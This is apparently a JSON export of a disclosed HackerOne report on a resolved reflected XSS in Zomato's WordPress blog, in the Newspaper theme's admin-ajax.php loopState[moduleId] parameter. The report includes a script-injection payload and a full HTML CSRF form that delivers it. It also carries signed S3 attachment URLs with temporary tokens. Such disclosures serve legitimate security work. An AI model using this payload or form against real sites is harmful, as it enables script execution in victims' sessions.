@@ -1,0 +1,141 @@
+{
+  "id": 335481,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzU0ODE=",
+  "url": "https://hackerone.com/reports/335481",
+  "title": "[Zomato's Blog] POST based XSS on https://www.zomato.com/blog/wp-admin/admin-ajax.php?td_theme_name=Newspaper&v=8.2",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2018-04-10T14:28:29.207Z",
+  "submitted_at": "2018-04-10T14:28:29.207Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "inferno-",
+    "url": "/inferno-",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/221/120/2741cdec70e9820c02c67e0f66b7498ae80b92f9_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 2943,
+    "url": "https://hackerone.com/eternal",
+    "handle": "eternal",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/9525xdsq4bz7ubnoie172ssjv8ul/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/9525xdsq4bz7ubnoie172ssjv8ul/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Eternal",
+      "twitter_handle": "Zomato",
+      "website": "https://www.eternal.com",
+      "about": "Eternal is India’s largest new-age tech company by market cap, comprising of 4 businesses (as of now) – Zomato, Blinkit, District, & Hyperpure."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-04-26T12:12:14.056Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-04-26T11:19:53.262Z",
+  "team_member_agreed_on_going_public_at": "2018-04-26T12:12:13.940Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "##Issue details:\nPOST based XSS \n\n##Vulnerable URL:\nhttps://www.zomato.com/blog/wp-admin/admin-ajax.php?td_theme_name=Newspaper&v=8.2\n\n##Vulnerable Parameter:\nloopState[moduleId]\n\n##Payload:\n<svg><script>prompt&#40;document.domain)</script>\n\n##Steps to reproduce:\n* As this is a post based you need to create a html csrf to trigger xss.\n* HTML code is below..\n\n<html>\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"https://www.zomato.com/blog/wp-admin/admin-ajax.php?td_theme_name=Newspaper&v=8.2\" method=\"POST\">\n      <input type=\"hidden\" name=\"action\" value=\"td&#95;ajax&#95;loop\" />\n      <input type=\"hidden\" name=\"loopState&#91;sidebarPosition&#93;\" value=\"\" />\n      <input type=\"hidden\" name=\"loopState&#91;moduleId&#93;\" value=\"&lt;svg&gt;&lt;script&gt;prompt&amp;&#35;40&#59;document&#46;domain&#41;&lt;&#47;script&gt;\" />\n      <input type=\"hidden\" name=\"loopState&#91;currentPage&#93;\" value=\"2\" />\n      <input type=\"hidden\" name=\"loopState&#91;max&#95;num&#95;pages&#93;\" value=\"4\" />\n      <input type=\"hidden\" name=\"loopState&#91;atts&#93;&#91;category&#95;id&#93;\" value=\"479\" />\n      <input type=\"hidden\" name=\"loopState&#91;atts&#93;&#91;offset&#93;\" value=\"2\" />\n      <input type=\"hidden\" name=\"loopState&#91;ajax&#95;pagination&#95;infinite&#95;stop&#93;\" value=\"3\" />\n      <input type=\"hidden\" name=\"loopState&#91;server&#95;reply&#95;html&#95;data&#93;\" value=\"\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>\n\n* Save this as a .html file.\n* Open that html file, it will trigger xss.\n\n##POC:\nScreenshot and necessary files are enclosed in attachment.\n\n## Impact\n\nReflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.",
+  "bounty_amount": "100.0",
+  "formatted_bounty": "$100",
+  "weakness": {
+    "id": 61,
+    "name": "Cross-site Scripting (XSS) - Reflected"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 283961,
+      "file_name": "zomato_xss.html",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/283/961/53a49219fe86588b906b9cb758c52ed8035298fc/zomato_xss.html?response-content-disposition=attachment%3B%20filename%3D%22zomato_xss.html%22%3B%20filename%2A%3DUTF-8%27%27zomato_xss.html&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYQP6YWPR%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T024125Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDCY%2BG6LyVug6SlfHpcqOrtUx3GYEUDFHJxlIuZKUxl2gIgNiJ8Xg5P8Gl0%2FsyICoep0u6YY0S0hvTJoKKYDhdK%2F%2FEqugUIov%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDN9vC2Z3aeGTqu0A7iqOBcWx6C0koAr9RXdcXGkONXf3S3mUPGrP0oi2GjHjCvVn7BrOVLwmn4Y3nb8efhPdEWTFHB9Kr8oHRaJPo8WO4MSUARKgKDAGcjY%2B3PSev%2BpmKovfLKuYC7XSfrSaTkqiQBkXdJ99Jj7xaAdLyl2H1nU4FWss1%2BECfqLbc2JTaYYsiA2DbR3ZQt8ckRSGXDm2v0y9sjK6PmkocRlONFkUsJvz2%2B8PYmvAdJRtQryFKJ7gyujmKs8rlLYsFr3N%2Foo74ArN0Z4kPTb17lmBdaybkQN%2FZzC7ScNQo1%2FFQzoMXLJEj8abxDqUuzoSk6Jtc7iMLV%2BMkTsgLtsIlRcftXlBcsI4p6ZZqVsp1E0HICsL3J1Nsfdf04v8YOoNXMKEW8lO1Eow3TLDI0m3aibZH96d9B5pFYVMBRvo%2FK0fspiS%2BN1qUcRlHBCrcC%2Ffo2BowlCCeXCcxiBGHVRGS3U%2B4p774qsvdUzM2%2Bl%2BCyHAsVamw7pI4TjVvV1ObitahEAI8uMRZcXE3%2F6Dca3JZx5IwkvY15KcvAAEA%2BxV5CqUX6kHY0hpQOKadm93jqVywZ40rcj3VvCUIH6dAWgwwepu0SM5sNH2hEiHH3GTWrbFKpSBnzLTftNIgoMW9Au%2BOAJVJ%2BpX8ZF35CqR24IUtr%2BJpK%2Fpj%2Fuj%2FX0nrwMsTFTP9Ee2esXckPBj6ecV9Ch7%2BhJLsRvi0UGTDYQCpJaWFl9923evj7k4sXbjnpOCLs5%2B%2BFMH7xKQ4VQXZ1NhfSDhxvI2DCE3Mrnid2pufF20A48oWRzP3vPG0fMYfaXEh04QV%2FL4wMULHuEEpInbS3sX50YDs%2FQSZN4xPN732L%2FXo6%2BqVZvO70CeCpQA%2FHo0l44JbYvtzzCviuTMBjqxAT9DP7VncRbkB4cXpbtogN%2Ft7NkQ1BMdMcEPAcc8FV2DlozzZMR6xv4TvV2PJnsuqLEdynkd8UoTaAfvgYS8Q5Q8OlnL4QW2BlpE5jwl3Mix%2F5AnaEGIjIcYWXNF2FaJXSvBVArCBHZt2L0T12aqs4GOB4YzphsPUts4PzITnGdGSjJ54QHM5dmrYUoe7bRtILWBPRYCCMixlXXHNBengJmU1tXPAxhOJISQiOEVv%2BTG0g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=59462a850133f4e4c659dfbb0f2cbef3320d4e28806c327dbc7af0d48661df7b",
+      "file_size": 1160,
+      "type": "text/html",
+      "moderated": null
+    },
+    {
+      "id": 283962,
+      "file_name": "xss.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/283/962/2489da20bcbeb3675bf1dfaaf4d59f405ac02d9a/xss.png?response-content-disposition=attachment%3B%20filename%3D%22xss.png%22%3B%20filename%2A%3DUTF-8%27%27xss.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYQP6YWPR%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T024125Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDCY%2BG6LyVug6SlfHpcqOrtUx3GYEUDFHJxlIuZKUxl2gIgNiJ8Xg5P8Gl0%2FsyICoep0u6YY0S0hvTJoKKYDhdK%2F%2FEqugUIov%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDN9vC2Z3aeGTqu0A7iqOBcWx6C0koAr9RXdcXGkONXf3S3mUPGrP0oi2GjHjCvVn7BrOVLwmn4Y3nb8efhPdEWTFHB9Kr8oHRaJPo8WO4MSUARKgKDAGcjY%2B3PSev%2BpmKovfLKuYC7XSfrSaTkqiQBkXdJ99Jj7xaAdLyl2H1nU4FWss1%2BECfqLbc2JTaYYsiA2DbR3ZQt8ckRSGXDm2v0y9sjK6PmkocRlONFkUsJvz2%2B8PYmvAdJRtQryFKJ7gyujmKs8rlLYsFr3N%2Foo74ArN0Z4kPTb17lmBdaybkQN%2FZzC7ScNQo1%2FFQzoMXLJEj8abxDqUuzoSk6Jtc7iMLV%2BMkTsgLtsIlRcftXlBcsI4p6ZZqVsp1E0HICsL3J1Nsfdf04v8YOoNXMKEW8lO1Eow3TLDI0m3aibZH96d9B5pFYVMBRvo%2FK0fspiS%2BN1qUcRlHBCrcC%2Ffo2BowlCCeXCcxiBGHVRGS3U%2B4p774qsvdUzM2%2Bl%2BCyHAsVamw7pI4TjVvV1ObitahEAI8uMRZcXE3%2F6Dca3JZx5IwkvY15KcvAAEA%2BxV5CqUX6kHY0hpQOKadm93jqVywZ40rcj3VvCUIH6dAWgwwepu0SM5sNH2hEiHH3GTWrbFKpSBnzLTftNIgoMW9Au%2BOAJVJ%2BpX8ZF35CqR24IUtr%2BJpK%2Fpj%2Fuj%2FX0nrwMsTFTP9Ee2esXckPBj6ecV9Ch7%2BhJLsRvi0UGTDYQCpJaWFl9923evj7k4sXbjnpOCLs5%2B%2BFMH7xKQ4VQXZ1NhfSDhxvI2DCE3Mrnid2pufF20A48oWRzP3vPG0fMYfaXEh04QV%2FL4wMULHuEEpInbS3sX50YDs%2FQSZN4xPN732L%2FXo6%2BqVZvO70CeCpQA%2FHo0l44JbYvtzzCviuTMBjqxAT9DP7VncRbkB4cXpbtogN%2Ft7NkQ1BMdMcEPAcc8FV2DlozzZMR6xv4TvV2PJnsuqLEdynkd8UoTaAfvgYS8Q5Q8OlnL4QW2BlpE5jwl3Mix%2F5AnaEGIjIcYWXNF2FaJXSvBVArCBHZt2L0T12aqs4GOB4YzphsPUts4PzITnGdGSjJ54QHM5dmrYUoe7bRtILWBPRYCCMixlXXHNBengJmU1tXPAxhOJISQiOEVv%2BTG0g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3187feec0f87a9b52fd8ea3d395455d8c5fd743ef75c510b41756e62deb9d60e",
+      "file_size": 85616,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 11,
+  "voters": [
+    "muon4",
+    "m0x01",
+    "eveeez",
+    "khizer47",
+    "bb00x",
+    "japz",
+    "cryptographer",
+    "vaterness",
+    "inferno-",
+    "haz3",
+    "and 1 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 383,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.zomato.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
